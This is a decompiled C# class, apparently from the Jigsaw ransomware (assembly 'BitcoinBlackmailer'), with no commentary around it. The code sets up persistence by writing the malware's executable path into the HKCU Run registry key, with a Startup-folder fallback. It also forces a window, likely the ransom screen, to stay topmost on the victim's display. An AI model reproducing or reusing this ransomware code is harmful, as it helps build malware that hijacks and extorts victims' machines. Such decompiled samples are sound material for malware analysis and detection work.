// Decompiled with JetBrains decompiler
// Type: Main.Tools.Windows
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 628485CE-1750-4702-9367-C5FFF8321F79
// Assembly location: C:\Users\IEUser\Desktop\clean\jigsaw-tamp2-cleaned.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Main.Tools
{
  internal static class Windows
  {
    private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
    private const uint SWP_NOSIZE = 1;
    private const uint SWP_NOMOVE = 2;

    internal static void SetStartup(Main.Tools.Windows.StartupMethodType startupMethod)
    {
      if (startupMethod != Main.Tools.Windows.StartupMethodType.StartupFolder)
      {
        if (startupMethod != Main.Tools.Windows.StartupMethodType.Registry)
          return;
        try
        {
          Main.Tools.Windows.SetStartupRegistry(Config.FinalExePath);
        }
        catch
        {
          Main.Tools.Windows.SetStartupFolder();
        }
      }
      else
        Main.Tools.Windows.SetStartupFolder();
    }

    private static void SetStartupFolder()
    {
      if (Config.FinalExeRelativePath == null)
        return;
      Config.FinalExePath = Main.Tools.Windows.smethod_2(Main.Tools.Windows.smethod_0(Environment.SpecialFolder.Startup), Main.Tools.Windows.smethod_1(Config.FinalExeRelativePath));
    }

    private static void SetStartupRegistry(string exePath)
    {
      RegistryKey registryKey_0 = Main.Tools.Windows.smethod_3(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      if (registryKey_0 == null)
        return;
      Main.Tools.Windows.smethod_4(registryKey_0, Main.Tools.Windows.smethod_1(exePath), (object) exePath);
    }

    internal static void RemoveStartupRegistry(string exePath)
    {
      RegistryKey registryKey_0 = Main.Tools.Windows.smethod_3(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      if (registryKey_0 == null)
        return;
      Main.Tools.Windows.smethod_5(registryKey_0, Main.Tools.Windows.smethod_1(exePath), false);
    }

    [DllImport("user32.dll")]
    private static extern bool SetWindowPos(
      IntPtr hWnd,
      IntPtr hWndInsertAfter,
      int X,
      int Y,
      int cx,
      int cy,
      uint uFlags);

    internal static void MakeTopMost(Form f) => Main.Tools.Windows.SetWindowPos(Main.Tools.Windows.smethod_6((Control) f), Main.Tools.Windows.HWND_TOPMOST, 0, 0, 0, 0, 3U);

    static string smethod_0(Environment.SpecialFolder specialFolder_0) => Environment.GetFolderPath(specialFolder_0);

    static string smethod_1(string string_0) => Path.GetFileName(string_0);

    static string smethod_2(string string_0, string string_1) => Path.Combine(string_0, string_1);

    static RegistryKey smethod_3(RegistryKey registryKey_0, string string_0, bool bool_0) => registryKey_0.OpenSubKey(string_0, bool_0);

    static void smethod_4(RegistryKey registryKey_0, string string_0, object object_0) => registryKey_0.SetValue(string_0, object_0);

    static void smethod_5(RegistryKey registryKey_0, string string_0, bool bool_0) => registryKey_0.DeleteValue(string_0, bool_0);

    static IntPtr smethod_6(Control control_0) => control_0.Handle;

    internal enum StartupMethodType
    {
      StartupFolder,
      Registry,
    }
  }
}
